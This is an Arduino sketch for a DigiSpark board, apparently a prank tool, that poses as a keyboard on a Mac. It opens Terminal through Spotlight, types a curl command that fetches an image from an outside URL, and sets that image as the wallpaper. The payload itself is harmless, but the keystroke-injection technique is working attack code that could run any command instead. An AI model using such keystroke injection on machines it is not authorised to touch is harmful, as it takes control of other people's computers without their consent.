/*
 *
 *  MacOS Wallpaper Changer by BrightShard
 *  It opens the terminal with Spotlight, downloads an image, and sets that as the wallpaper
 *  The default changed wallpaper is Handsome Squidward, although the URL can be changed to a different one
 *
*/

#include "DigiKeyPlus.h"
DigiKeyPlus keyboard;
const char* url = "https://cdn.wallpapersafari.com/69/4/j0JeYp.jpg"; // URL of wallpaper to set

// The actual keyboard attack
void script() {
  keyboard.MacSpotlight("Terminal"); // Open the terminal
  keyboard.Append("cd /tmp; curl -o wallpaper "); // Start the cURL command
  keyboard.Type(url); // Add URL to the command and hit enter
  keyboard.Wait(3000); // Wait for the image to download
  keyboard.Type("osascript -e 'tell application \"Finder\" to set the desktop picture to POSIX file \"/tmp/wallpaper\"'"); // Set wallpaper
  keyboard.Wait(2000); // In case we have a slow one
  keyboard.Type("exit"); // Exit terminal
  keyboard.Wait(200); // In case we have a slow one
  keyboard.Type(KEY_Q, MOD_GUI_LEFT); // Quit the terminal app
}

void setup() {
  /* Keyboard attack handler:
   *  1 - the slowFactor variable, turn this up on slower machines for more delays & stability
   *  0 - the pin of the pushbutton on the DigiSpark, change it to -1 if there's no button
   *  script - the function of the HID attack
   */
  keyboard.Init(1, 0, script);
}

void loop() {
  keyboard.Update(); // Keep keyboard alive & handle button presses
}
